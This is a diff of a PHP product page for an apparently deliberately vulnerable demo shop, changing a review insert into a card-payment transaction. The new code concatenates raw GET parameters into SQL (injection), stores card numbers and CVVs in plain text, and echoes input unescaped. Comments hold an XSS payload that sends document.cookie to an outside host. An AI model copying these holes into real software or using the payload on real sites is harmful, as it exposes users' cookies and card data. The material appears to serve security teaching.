@@ -48,13 +48,17 @@ if (isset($_COOKIE["email"]) && isset($_GET["action"]) && isset($_GET["qty"]) &&
 	setcookie("cctype",$_GET["cctype"]);
 	setcookie("expiry",$_GET["expiry"]);
 
-	$qc = "INSERT INTO product_comments VALUES (NULL, ".$_GET["product"].", '".$_GET["email"]."', '".$_GET["comment"]."')";
+	$qc = "INSERT INTO transaction (uid,prodid,ccnumber,cvvnumber,expiry,qty) VALUES 
+			('".$_COOKIE["email"]."', ".$_GET["product"].", '".$_GET["cc"]."', 
+				'".$_GET["cvv"]."', '".$_GET["expiry"]."', ".$_GET["qty"].")";
+
 	$rc = mysql_query($qc);
 	if ($rc) {
 		?>
-		<div style="border: 1px solid #C9C9C9; width: 300px; padding: 5px 10px; margin: 10px 0 10px 0; font-size: 12px;">
-		Your Review has been added. Scroll to the bottom to check.
+		<div style="border: 1px solid #C9C9C9; width: 300px; padding: 5px 10px; margin: 10px 0 10px 0; font-size: 14px;">
+		<span style="color: green;">Congrats!</span> Your order has been placed. You will get an email soon about this transaction.
 		</div>
+		<!--<script></script>-->
 		<?php
 	}
 
@@ -106,7 +110,7 @@ if (mysql_num_rows($r) == 0) {
 						<br /><input type="submit" name="processpurchase" value="Continue" />
 					</form>
 					<?php } else { ?>
-						Please <a href="user.php?next=<?= $_GET['product'] ?>">Sign-In</a> To purchase
+						Please <a href="signin.php?next=<?= $_GET['product'] ?>">Sign-In</a> To purchase
 					<?php } ?>
 				</div>					
 
@@ -171,6 +175,6 @@ if (mysql_num_rows($r) == 0) {
 <!-- Chrome has AntiXSS filter so cool - http://blog.securitee.org/?p=37 -->
 <!-- Steal cookies using XSS -->
 <!-- http://amazon.two/product.php?product=%3Cscript%3Enew%20Image%28%29.src=%22http://google.com%22%3C/script%3E-->
-<!-- http://amazon.two/product.php?product=<script>new Image().src="http://good.site/attacks/showimage.php?param="+document.cookie</script> -->
+<!-- http://amazon.two/product.php?product=<script>new Image().src="http://good.site/iamgood/showimage.php?"+document.cookie</script> -->
 <!-- html injection vulnerability for breadcrumb -->
 <!-- python script to demonstrate CSRF vulnerability-->
